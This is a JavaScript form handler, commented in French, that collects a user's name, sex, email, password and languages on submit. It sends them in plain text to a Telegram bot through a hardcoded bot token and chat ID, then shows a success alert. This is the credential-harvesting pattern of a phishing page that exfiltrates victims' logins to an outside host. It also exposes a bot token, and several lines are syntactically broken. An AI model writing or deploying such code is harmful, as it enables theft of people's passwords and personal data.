
<script>
async function envoyerVersTelegram(event) {
    event.preventDefault(); // Empêche l'envoi normal du formulaire

    const nom = document.getElementById('nom').value;
    const postNom = document.getElementById('post_nom').value;
    const prenom = document.getElementById('prenom').value;
    const sexe = document.querySelector('input[name="SEXE"]:checked').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Récupérer les langues sélectionnées
    const languesCheckboxes = document.querySelectorAll('input[name="langues"]:checked');
    const langues = Array.from(languesCheckboxes).map(checkbox => checkbox.value).join(', ');

    // Préparer le message à envoyer
    const message = Nom: ${nom}\nPost Nom: ${postNom}\nPrénom: ${prenom}\nSexe: ${sexe}\nEmail: ${email}\nMot de passe: ${password}\nLangue(s): ${langues};

    // Remplacez 'YOUR_BOT_TOKEN' et 'YOUR_CHAT_ID' par vos valeurs
    const botToken = 7448490532:AAHS5vRJGbXLM6uC3Ym8JGQLnOI7FmbMcBI';
    const chatId = '6798669588';
    
    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

    try {
        const response = await fetch(url);
        if (response.ok) {
            alert('Informations envoyées avec succès !');
        } else {
            alert('Erreur lors de l\'envoi des informations.');
        }
    } catch (error) {
        console.error('Erreur:', error);
        alert('Une erreur est survenue.');
    }
}
</script>
